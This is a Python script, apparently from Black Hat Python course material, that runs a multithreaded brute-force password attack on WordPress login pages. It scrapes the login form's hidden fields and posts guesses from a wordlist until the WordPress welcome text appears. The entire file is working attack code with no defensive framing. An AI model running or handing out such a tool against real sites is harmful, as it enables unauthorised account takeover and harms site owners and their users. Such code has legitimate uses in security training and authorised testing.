from bhp3_class.web import get_words
from collections import deque
from io import BytesIO
from lxml import etree

import requests
import sys
import threading
import time

EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
SUCCESS = 'Welcome to WordPress!'
WORDLIST = '/mydownloads/cain.txt'

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished setup; username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        while True:
            time.sleep(5)
            try:
                brute = passwords.popleft()
            except IndexError:
                print('Thread quits with no match.')
                sys.exit()
            print(f'Trying username/password {self.username}/{brute:<10}')

            resp0 = session.get(self.url)
            params = get_params(resp0.content)
            params['log'] = self.username
            params['pwd'] = brute

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % brute)
                passwords.clear()
                print('done: now cleaning up.')
                

if __name__ == '__main__':
    username = input('Enter username: ')
    url = input("input WP url: ")
    words = get_words(WORDLIST)
    b = Bruter(username, url)
    b.run_bruteforce(deque(words))


    

            

